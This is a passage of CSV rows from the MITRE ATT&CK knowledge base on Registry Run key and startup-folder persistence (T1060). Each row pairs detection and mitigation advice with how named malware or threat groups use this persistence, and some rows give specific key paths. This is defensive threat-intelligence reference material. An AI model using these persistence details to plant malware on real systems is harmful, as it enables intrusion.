<code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe</code>. Other variants have set the following Registry key for persistence: <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self]</code>. [[CiteRef::Lotus Blossom Jun 2015]]']",['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: Elise, BKDR_ESILE, Page",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1182,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['Variants of [[Software/S0082|Emissary]] have added Run Registry keys to establish persistence.[[CiteRef::Emissary Trojan Feb 2016]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Emissary,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1183,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['The [[Software/S0089|BlackEnergy]] 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.[[CiteRef::F-Secure BlackEnergy 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: BlackEnergy, Black Energy",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1184,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0031|BACKSPACE]] achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: BACKSPACE, Lecna",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1185,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['The ""SCOUT"" variant of [[Software/S0034|NETEAGLE]] achieves persistence by adding itself to the <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: NETEAGLE,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1186,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0028|SHIPSHAPE]] achieves persistence by creating a shortcut in the Startup folder.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: SHIPSHAPE,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1187,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","[""[[Software/S0035|SPACESHIP]] achieves persistence by creating a shortcut in the current user's Startup folder.[[CiteRef::FireEye APT30]]""]",['APT30'],['APT30'],['G0013'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: SPACESHIP,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1188,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","[""[[Software/S0036|FLASHFLOOD]] achieves persistence by making an entry in the Registry's Run key.[[CiteRef::FireEye APT30]]""]",['APT30'],['APT30'],['G0013'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: FLASHFLOOD,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1189,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","[u'To establish persistence, [[Software/S0058|SslMM]] identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \u201cOffice Start,\u201d \u201cYahoo Talk,\u201d \u201cMSN Gaming Z0ne,\u201d or \u201cMSN Talk\u201d shortcut.[[CiteRef::Baumgartner Naikon 2015]]']",['Naikon'],['Naikon'],['G0019'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: SslMM,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1190,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Group/G0051|FIN10]] has established persistence by using the Registry option in PowerShell Empire to add a Run key.[[CiteRef::FireEye FIN10 June 2017]][[CiteRef::Github PowerShell Empire]]'],['FIN10'],['FIN10'],['G0051'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1191,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0093|Backdoor.Oldrea]] adds Registry Run keys to achieve persistence.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: Backdoor.Oldrea, Havex",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1192,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0094|Trojan.Karagany]] can create a link to itself in the Startup folder to automatically start itself upon system restart.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Trojan.Karagany,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1193,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Group/G0012|Darkhotel]] has been known to establish persistence by adding programs to the Run Registry key.[[CiteRef::Kaspersky Darkhotel]]'],['Darkhotel'],['Darkhotel'],['G0012'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1194,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Group/G0037|FIN6]] has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.[[CiteRef::FireEye FIN6 April 2016]]'],['FIN6'],['FIN6'],['G0037'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1195,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0085|S-Type]] may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}</code>.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: S-Type,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1196,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['One persistence mechanism used by [[Software/S0046|CozyCar]] is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: <br><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> <br><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> <br><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code> <br><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>[[CiteRef::F-Secure CozyDuke]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: CozyCar, CozyDuke, ...",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1197,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0053|SeaDuke]] is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.[[CiteRef::Unit 42 SeaDuke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1198,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Software/S0139|PowerDuke]] achieves persistence by using various Registry Run keys.[[CiteRef::Volexity PowerDuke November 2016]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: PowerDuke,['Persistence'],['Technique/T1060'],['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1199,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']",['[[Group/G0016|APT29]] added Registry Run keys to establish persistence.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],['Technique/T1060'],['Registry Run Keys / Start 